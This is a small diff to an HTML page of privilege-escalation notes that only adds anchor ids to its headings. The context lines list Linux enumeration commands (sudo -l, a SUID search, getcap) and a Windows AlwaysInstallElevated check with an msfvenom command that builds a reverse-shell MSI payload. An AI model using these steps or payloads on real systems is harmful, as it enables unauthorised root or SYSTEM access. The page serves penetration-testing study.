@@ -27,11 +27,11 @@
 		</div>
 
 <div class="paragraph">
-	<p class="subtitle">Linux:</p>
+	<p id="linux" class="subtitle">Linux:</p>
 <p class="content"><ul class="content"><li><span class="code">id</span><br>Better than "whoami" because it might show interesting groups.</li><li><span class="code">sudo -l</span><br>Lists all files the current user has permission to execute as root.</li><li><span class="code">find / -perm 4000 2&gt;/dev/null</span><br>Lists all files that have SUID bit set.</li><li><span class="code">getcap -r / 2&gt;/dev/null</span><br>Lists all files with capabilities.</li></ul></p>
 </div>
 <div class="paragraph">
-	<p class="subtitle">Windows:</p>
+	<p id="windows" class="subtitle">Windows:</p>
 <p class="content"><ul class="content"><li><span class="code">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="code">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br>If both are set to 1, the system installs MSI packages as nt authority/system. Generate a reverse shell using something like msfvenom to generate a payload: <span class="code">msfvenom -p windows/x64/shell/reverse_tcp -f msi LHOST=&lt;your ip&gt; LPORT=&lt;your port&gt; RHOST=&lt;target ip&gt; &gt; hack.msi</span>.</li></ul></p>
 </div>
 		<br>
